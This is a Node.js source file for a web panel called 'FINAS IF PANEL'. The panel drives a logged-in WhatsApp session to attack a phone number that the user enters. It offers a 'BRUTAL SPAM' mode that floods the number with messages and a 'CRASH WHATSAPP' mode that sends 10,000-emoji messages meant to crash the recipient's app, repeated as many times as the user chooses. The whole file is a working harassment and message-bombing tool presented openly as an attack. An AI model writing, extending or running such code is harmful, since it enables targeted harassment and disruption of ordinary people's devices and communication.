const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const port = process.env.PORT || 3000;

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote', '--single-process', '--disable-gpu'] 
    }
});

client.on('qr', (qr) => {
    console.log('SCAN QR DI LOGS RAILWAY:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('✅ FINAS IF PANEL ONLINE!');
});

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>FINAS IF PANEL</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #050505; color: #fff; font-family: 'Arial', sans-serif; text-align: center; padding: 20px; }
                .card { border: 2px solid #bc13fe; background: #000; padding: 20px; border-radius: 20px; box-shadow: 0 0 20px #bc13fe; max-width: 400px; margin: auto; }
                
                /* LINK FOTO FIX */
                .banner { 
                    width: 100%; 
                    border-radius: 15px; 
                    margin-bottom: 15px;
                    border: 1px solid #bc13fe;
                }
                
                h1 { color: #fff; text-shadow: 0 0 10px #bc13fe; font-size: 24px; }
                input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #bc13fe; background: #111; color: #fff; }
                button { background: #bc13fe; color: #fff; font-weight: bold; cursor: pointer; border: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://i.ibb.co/WpyXNbPY/image.png" class="banner">
                
                <h1>FINAS IF PANEL</h1>
                <p style="color: #00ff00; font-size: 12px;">● SYSTEM ACTIVE</p>
                
                <form action="/attack" method="POST">
                    <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
                    <select name="type">
                        <option value="spam">💥 BRUTAL SPAM</option>
                        <option value="crash">💀 CRASH WHATSAPP</option>
                    </select>
                    <input type="number" name="count" placeholder="Jumlah" value="10" required>
                    <button type="submit">EXECUTE ATTACK</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    let text = "🔥 ATTACKED BY FINAS IF 🔥"; 
    if (type === "crash") text = "💀".repeat(10000);
    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            await new Promise(r => setTimeout(r, 1000));
        } catch (e) { console.log(e); }
    }
    res.send('<h2>Serangan Berhasil Dikirim!</h2><a href="/" style="color:#bc13fe;">Kembali</a>');
});

app.listen(port, '0.0.0.0', () => {
    console.log('Server running on port: ' + port);
});

client.initialize();
